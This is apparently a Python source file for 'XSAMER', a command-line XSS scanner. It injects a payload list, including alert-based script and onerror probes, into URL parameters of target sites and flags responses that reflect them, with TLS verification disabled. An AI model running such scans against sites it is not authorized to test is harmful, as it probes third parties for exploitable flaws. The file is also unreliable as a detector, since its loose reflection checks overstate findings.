#!/usr/bin/env python3
import requests
import json
import time
import argparse
import sys
from urllib.parse import urljoin, urlparse
import os
import glob

def show_banner():
    """Display XSAMER banner"""
    print("""
██╗  ██╗███████╗ █████╗ ███╗   ███╗███████╗██████╗ 
╚██╗██╔╝██╔════╝██╔══██╗████╗ ████║██╔════╝██╔══██╗
 ╚███╔╝ ███████╗███████║██╔████╔██║█████╗  ██████╔╝
 ██╔██╗ ╚════██║██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗
██╔╝ ██╗███████║██║  ██║██║ ╚═╝ ██║███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
                                                    
   --------------   Welcome to XSAMER  BY Samer EL HAGE ----------- """)


class XSSTester:
    def __init__(self):
        self.payloads_file = "xss_payloads.json"
        self.results_file = "xsamer_result.txt"  # Changed to only vulnerable results
        self.payloads_dir = "payloads"
        self.urls_file = "urls.txt"
        self.verbose = False
        self.load_payloads()
        
    def load_payloads(self):
        """Load XSS payloads from JSON file and payloads directory"""
        # Create payloads directory if it doesn't exist
        os.makedirs(self.payloads_dir, exist_ok=True)
        
        # Load from JSON file
        if os.path.exists(self.payloads_file):
            with open(self.payloads_file, 'r') as f:
                self.payloads = json.load(f)
        else:
            # Default payloads
            self.payloads = {
                "basic_xss": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert(1)>",
                    "\"><svg onload=alert(1)>",
                    "javascript:alert('XSS')",
                    "<body onload=alert('XSS')>"
                ]
            }
            self.save_payloads()
        
        # Load payloads from text files
        self.load_payloads_from_files()
    
    def load_payloads_from_files(self):
        """Load additional payloads from .txt files in payloads directory"""
        txt_files = glob.glob(os.path.join(self.payloads_dir, "*.txt"))
        
        for file_path in txt_files:
            category_name = os.path.splitext(os.path.basename(file_path))[0]
            
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
                if payloads:
                    if category_name in self.payloads:
                        # Merge with existing category
                        existing_payloads = set(self.payloads[category_name])
                        new_payloads = [p for p in payloads if p not in existing_payloads]
                        self.payloads[category_name].extend(new_payloads)
                        if self.verbose:
                            print(f"[+] Loaded {len(new_payloads)} payloads from {file_path} into '{category_name}'")
                    else:
                        # Create new category
                        self.payloads[category_name] = payloads
                        if self.verbose:
                            print(f"[+] Created category '{category_name}' with {len(payloads)} payloads from {file_path}")
            
            except Exception as e:
                print(f"[-] Error loading {file_path}: {e}")
    
    def get_all_xss_payloads(self):
        """Get all payloads from basic_xss, advanced_xss, and dom_xss categories"""
        all_payloads = []
        target_categories = ['basic_xss', 'advanced_xss', 'dom_xss']
        
        for category in target_categories:
            if category in self.payloads:
                all_payloads.extend(self.payloads[category])
                if self.verbose:
                    print(f"[+] Added {len(self.payloads[category])} payloads from {category}")
            else:
                if self.verbose:
                    print(f"[-] Category '{category}' not found")
        
        return all_payloads
    
    def load_urls_from_file(self, file_path):
        """Load URLs from a text file"""
        if not os.path.exists(file_path):
            print(f"[-] URLs file not found: {file_path}")
            return []
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            # Validate URLs
            valid_urls = []
            for url in urls:
                if url.startswith(('http://', 'https://')):
                    valid_urls.append(url)
                else:
                    valid_urls.append('https://' + url)
            
            print(f"[+] Loaded {len(valid_urls)} URLs from {file_path}")
            return valid_urls
            
        except Exception as e:
            print(f"[-] Error loading URLs from {file_path}: {e}")
            return []
    
    def save_payloads(self):
        """Save payloads to JSON file"""
        with open(self.payloads_file, 'w') as f:
            json.dump(self.payloads, f, indent=4)
    
    def save_vulnerable_results(self, results):
        """Save only vulnerable results to file"""
        vulnerable = [r for r in results if r.get('reflected') and not r.get('error')]
        
        if not vulnerable:
            print("[-] No vulnerable results to save")
            return
        
        try:
            with open(self.results_file, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write("XSAMER - XSS VULNERABILITY SCAN RESULTS\n")
                f.write("=" * 80 + "\n")
                f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Vulnerabilities Found: {len(vulnerable)}\n")
                f.write("=" * 80 + "\n\n")
                
                for i, vuln in enumerate(vulnerable, 1):
                    f.write(f"VULNERABILITY #{i}\n")
                    f.write(f"URL: {vuln['test_url']}\n")
                    f.write(f"Payload: {vuln['payload']}\n")
                    f.write(f"Method: {vuln['method']}\n")
                    f.write(f"Parameter: {vuln['parameter']}\n")
                    f.write(f"Reflection Points: {', '.join(vuln['reflection_points'])}\n")
                    f.write(f"Status Code: {vuln['status_code']}\n")
                    f.write("-" * 80 + "\n\n")
            
            print(f"[+] Vulnerable results saved to: {self.results_file}")
            print(f"[+] Total vulnerabilities recorded: {len(vulnerable)}")
            
        except Exception as e:
            print(f"[-] Error saving results: {e}")
    
    def import_payloads_from_file(self, file_path, category_name=None):
        """Import payloads from a text file"""
        if not os.path.exists(file_path):
            print(f"[-] File not found: {file_path}")
            return False
        
        if category_name is None:
            category_name = os.path.splitext(os.path.basename(file_path))[0]
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            if not payloads:
                print(f"[-] No payloads found in {file_path}")
                return False
            
            if category_name in self.payloads:
                # Add to existing category
                existing_payloads = set(self.payloads[category_name])
                new_payloads = [p for p in payloads if p not in existing_payloads]
                self.payloads[category_name].extend(new_payloads)
                print(f"[+] Added {len(new_payloads)} payloads to existing category '{category_name}'")
            else:
                # Create new category
                self.payloads[category_name] = payloads
                print(f"[+] Created new category '{category_name}' with {len(payloads)} payloads")
            
            self.save_payloads()
            return True
            
        except Exception as e:
            print(f"[-] Error importing from {file_path}: {e}")
            return False
    
    def show_payloads(self):
        """Display all available payloads"""
        print("\n" + "="*50)
        print("AVAILABLE XSS PAYLOADS")
        print("="*50)
        
        total_payloads = 0
        for category, payload_list in self.payloads.items():
            print(f"\n[{category.upper()}] - {len(payload_list)} payloads")
            for i, payload in enumerate(payload_list[:10], 1):  # Show first 10 only
                print(f"  {i}. {payload}")
            if len(payload_list) > 10:
                print(f"  ... and {len(payload_list) - 10} more")
            total_payloads += len(payload_list)
        
        print(f"\n📊 Total categories: {len(self.payloads)}")
        print(f"📊 Total payloads: {total_payloads}")
        
        # Show XSS combo info
        xss_payloads = self.get_all_xss_payloads()
        print(f"\n🎯 XSS Combo (basic_xss + advanced_xss + dom_xss): {len(xss_payloads)} payloads")
    
    def get_status_color(self, status_code):
        """Get color for status code"""
        if 200 <= status_code < 300:
            return "🟢"  # Green for success
        elif 300 <= status_code < 400:
            return "🟡"  # Yellow for redirect
        elif 400 <= status_code < 500:
            return "🔴"  # Red for client error
        elif 500 <= status_code < 600:
            return "🟣"  # Purple for server error
        else:
            return "⚪"  # White for other
    
    def test_url(self, url, payload, method="GET", param="q"):
        """Test a single URL with a payload"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        try:
            if method.upper() == "GET":
                # Test in URL parameters
                test_url = f"{url}?{param}={requests.utils.quote(payload)}"
                if self.verbose:
                    print(f"   🔍 Testing: {param}={payload}")
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            else:
                # Test in POST data
                data = {param: payload}
                if self.verbose:
                    print(f"   🔍 Testing: POST {param}={payload}")
                response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)
            
            # Check for reflection
            reflection_points = self.check_reflection(response.text, payload)
            
            result = {
                'url': url,
                'test_url': test_url if method.upper() == "GET" else url,
                'payload': payload,
                'method': method,
                'parameter': param,
                'status_code': response.status_code,
                'reflected': len(reflection_points) > 0,
                'reflection_points': reflection_points,
                'content_length': len(response.text),
                'error': False
            }
            
            status_color = self.get_status_color(response.status_code)
            
            if self.verbose:
                if result['reflected']:
                    print(f"   🚨 REFLECTED! {status_color} {response.status_code} | Points: {reflection_points}")
                else:
                    print(f"   {status_color} {response.status_code} | No reflection")
            
            return result
            
        except Exception as e:
            if self.verbose:
                print(f"   ❌ Error: {e}")
            return {
                'url': url,
                'payload': payload,
                'error': True,
                'error_message': str(e)
            }
    
    def check_reflection(self, content, payload):
        """Check where the payload is reflected in the response"""
        reflection_points = []
        
        # Check different contexts
        if payload in content:
            reflection_points.append("raw")
        
        encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        if encoded_payload in content:
            reflection_points.append("html_encoded")
        
        if f'"{payload}"' in content:
            reflection_points.append("in_quotes")
        
        if f"> {payload}" in content or f"{payload} <" in content:
            reflection_points.append("in_text")
        
        # Check for partial reflection
        for char in ['<', '>', '"', "'"]:
            if char in payload and char in content:
                reflection_points.append(f"contains_{char}")
        
        return reflection_points
    
    def scan_website(self, target_url, categories=None, methods=None, parameters=None, use_xss_combo=False):
        """Perform comprehensive XSS scanning for a single URL"""
        if use_xss_combo:
            # Use the special XSS combo
            payloads_to_use = self.get_all_xss_payloads()
            categories_used = "XSS Combo (basic+advanced+dom)"
        elif categories is None:
            # Use all categories by default
            categories = list(self.payloads.keys())
            payloads_to_use = []
            for cat in categories:
                payloads_to_use.extend(self.payloads[cat])
            categories_used = "All categories"
        else:
            # Use specified categories
            payloads_to_use = []
            for cat in categories:
                if cat in self.payloads:
                    payloads_to_use.extend(self.payloads[cat])
            categories_used = ', '.join(categories)
        
        if methods is None:
            methods = ['GET']
        if parameters is None:
            parameters = ['q', 'search', 'query', 'id', 'page', 'name', 'email']
        
        print(f"\n🎯 Scanning: {target_url}")
        print(f"📂 Categories: {categories_used}")
        print(f"🔧 Methods: {', '.join(methods)}")
        print(f"📝 Parameters: {', '.join(parameters)}")
        print(f"📊 Total payloads: {len(payloads_to_use)}")
        
        if self.verbose:
            print(f"\n📋 Payloads to test:")
            for i, payload in enumerate(payloads_to_use[:5], 1):
                print(f"   {i}. {payload}")
            if len(payloads_to_use) > 5:
                print(f"   ... and {len(payloads_to_use) - 5} more")
        
        results = []
        total_tests = len(payloads_to_use) * len(methods) * len(parameters)
        current_test = 0
        
        vulnerabilities_found = 0
        
        # Status code statistics
        status_stats = {}
        
        for payload in payloads_to_use:
            for method in methods:
                for param in parameters:
                    current_test += 1
                    if not self.verbose:
                        status_info = ""
                        print(f"\r[*] Progress: {current_test}/{total_tests} | Testing: {payload[:30]}... {status_info}", end="", flush=True)
                    
                    result = self.test_url(target_url, payload, method, param)
                    
                    # Update status statistics
                    if not result.get('error'):
                        status_code = result['status_code']
                        if status_code in status_stats:
                            status_stats[status_code] += 1
                        else:
                            status_stats[status_code] = 1
                    
                    if result.get('reflected'):
                        vulnerabilities_found += 1
                        if not self.verbose:
                            status_color = self.get_status_color(result['status_code'])
                            print(f"\n🚨 VULNERABILITY FOUND!")
                            print(f"   🔴 URL: {result['test_url']}")
                            print(f"   📦 Payload: {result['payload']}")
                            print(f"   📍 Reflection: {result['reflection_points']}")
                            print(f"   📊 Status: {status_color} {result['status_code']}")
                    
                    results.append(result)
                    
                    # Rate limiting
                    time.sleep(0.1)
        
        if not self.verbose:
            print()  # New line after progress
        
        # Show status code summary
        if status_stats:
            print(f"\n📊 STATUS CODE SUMMARY:")
            for status_code, count in sorted(status_stats.items()):
                status_color = self.get_status_color(status_code)
                print(f"   {status_color} {status_code}: {count} responses")
        
        return results, vulnerabilities_found
    
    def scan_multiple_urls(self, urls, categories=None, methods=None, parameters=None, use_xss_combo=False):
        """Scan multiple URLs from a list"""
        all_results = []
        total_vulnerabilities = 0
        
        if use_xss_combo:
            combo_payloads = self.get_all_xss_payloads()
            print(f"\n🔍 Starting scan of {len(urls)} URLs with XSS Combo")
            print(f"📂 Using XSS Combo: {len(combo_payloads)} payloads (basic+advanced+dom)")
        else:
            if categories is None:
                categories = list(self.payloads.keys())
            total_payloads = sum(len(self.payloads.get(cat, [])) for cat in categories)
            print(f"\n🔍 Starting scan of {len(urls)} URLs")
            print(f"📂 Using {len(categories)} payload categories")
            print(f"📊 Total payloads: {total_payloads}")
        
        print("="*60)
        
        for i, url in enumerate(urls, 1):
            print(f"\n[{i}/{len(urls)}] Scanning: {url}")
            
            results, vuln_count = self.scan_website(
                url, 
                categories=categories,
                methods=methods,
                parameters=parameters,
                use_xss_combo=use_xss_combo
            )
            all_results.extend(results)
            total_vulnerabilities += vuln_count
            
            # Brief pause between URLs
            time.sleep(0.5)
        
        return all_results, total_vulnerabilities
    
    def generate_report(self, results, total_vulnerabilities=0):
        """Generate a summary report"""
        vulnerable = [r for r in results if r.get('reflected') and not r.get('error')]
        
        print("\n" + "="*60)
        print("📊 XSS SCAN REPORT")
        print("="*60)
        print(f"Total tests performed: {len(results)}")
        print(f"Potential vulnerabilities found: {len(vulnerable)}")
        
        if vulnerable:
            print("\n🚨 POTENTIAL XSS VULNERABILITIES FOUND:")
            for i, vuln in enumerate(vulnerable, 1):
                status_color = self.get_status_color(vuln['status_code'])
                print(f"\n{i}. 🔴 URL: {vuln['test_url']}")
                print(f"   📦 Payload: {vuln['payload']}")
                print(f"   ⚡ Method: {vuln['method']}")
                print(f"   🔧 Parameter: {vuln['parameter']}")
                print(f"   📍 Reflection: {', '.join(vuln['reflection_points'])}")
                print(f"   📊 Status: {status_color} {vuln['status_code']}")
        else:
            print("\n✅ No obvious XSS vulnerabilities detected.")
            print("💡 Note: This tool checks for reflection. Manual verification is recommended.")

def main():
    # Show banner when no arguments provided
    if len(sys.argv) == 1:
        show_banner()
        print("👋 Welcome to XSS Scanner by Samer EL HAGE")
        print("=" * 50)
        print("Usage: xsamer [OPTIONS]")
        print("\nQuick Start:")
        print("  xsamer -u https://example.com        # Scan single URL")
        print("  xsamer -l urls.txt                   # Scan URLs from file")
        print("  xsamer -u https://example.com -xss   # Use XSS Combo")
        print("  xsamer -u https://example.com -v     # Verbose mode (shows status codes)")
        print("  xsamer --show                        # Show all payloads")
        print("\nUse 'xsamer -h' for full help")
        return

    parser = argparse.ArgumentParser(description='🚀 XSAMER - Advanced XSS Scanner Tool', 
                                   usage='xsamer [OPTIONS]')
    
    # Main scanning options
    parser.add_argument('-u', '--url', help='Single URL to scan')
    parser.add_argument('-l', '--list', dest='urls_file', help='File containing list of URLs to scan')
    parser.add_argument('-xss', action='store_true', help='Use XSS Combo (basic_xss + advanced_xss + dom_xss)')
    
    # Payload and scanning options
    parser.add_argument('-c', '--categories', nargs='+', help='Specific payload categories to use')
    parser.add_argument('-p', '--params', nargs='+', default=['q', 'search', 'query', 'id', 'page'], 
                       help='Parameters to test (default: q,search,query,id,page)')
    parser.add_argument('-m', '--methods', nargs='+', default=['GET'], 
                       help='HTTP methods to test (default: GET)')
    
    # Information and debug options
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output (shows status codes)')
    parser.add_argument('--show', action='store_true', help='Show all available payloads')
    parser.add_argument('--import-payloads', help='Import payloads from text file')
    
    args = parser.parse_args()
    scanner = XSSTester()
    scanner.verbose = args.verbose
    
    # Show payloads
    if args.show:
        scanner.show_payloads()
        return
    
    # Import payloads
    if args.import_payloads:
        scanner.import_payloads_from_file(args.import_payloads)
        return
    
    # Determine URLs to scan
    urls_to_scan = []
    
    if args.urls_file:
        # Load URLs from file
        urls_to_scan = scanner.load_urls_from_file(args.urls_file)
        if not urls_to_scan:
            print("[-] No valid URLs found to scan")
            return
    elif args.url:
        # Single URL provided
        url = args.url
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        urls_to_scan = [url]
    else:
        # Check if urls.txt exists by default
        if os.path.exists('urls.txt'):
            urls_to_scan = scanner.load_urls_from_file('urls.txt')
            if not urls_to_scan:
                print("[-] No valid URLs found in urls.txt")
                return
        else:
            print("[-] Please provide a URL using -u or URL list using -l")
            parser.print_help()
            return
    
    # Determine payload categories
    if args.xss:
        # Use XSS Combo (basic + advanced + dom)
        use_xss_combo = True
        categories_to_use = None
        print("[+] Using XSS Combo: basic_xss + advanced_xss + dom_xss")
    elif args.categories:
        # Use specified categories
        use_xss_combo = False
        categories_to_use = args.categories
        print(f"[+] Using specified categories: {', '.join(categories_to_use)}")
    else:
        # Use all available categories by default
        use_xss_combo = False
        categories_to_use = list(scanner.payloads.keys())
        print(f"[+] Using all {len(categories_to_use)} payload categories")
    
    # Show scanning info
    if use_xss_combo:
        total_payloads = len(scanner.get_all_xss_payloads())
    else:
        total_payloads = sum(len(scanner.payloads.get(cat, [])) for cat in categories_to_use)
    
    print(f"[+] Total payloads to test: {total_payloads}")
    print(f"[+] Total URLs to scan: {len(urls_to_scan)}")
    if args.verbose:
        print("[+] Verbose mode: ON - Showing status codes for each payload")
    
    # Perform scanning
    if len(urls_to_scan) == 1:
        # Single URL scan
        results, vuln_count = scanner.scan_website(
            urls_to_scan[0], 
            categories=categories_to_use,
            methods=args.methods,
            parameters=args.params,
            use_xss_combo=use_xss_combo
        )
    else:
        # Multiple URLs scan
        results, vuln_count = scanner.scan_multiple_urls(
            urls_to_scan,
            categories=categories_to_use,
            methods=args.methods,
            parameters=args.params,
            use_xss_combo=use_xss_combo
        )
    
    # Generate report and save only vulnerable results
    scanner.generate_report(results, vuln_count)
    scanner.save_vulnerable_results(results)

if __name__ == "__main__":
    # Disable SSL warnings for testing
    requests.packages.urllib3.disable_warnings()
    main()
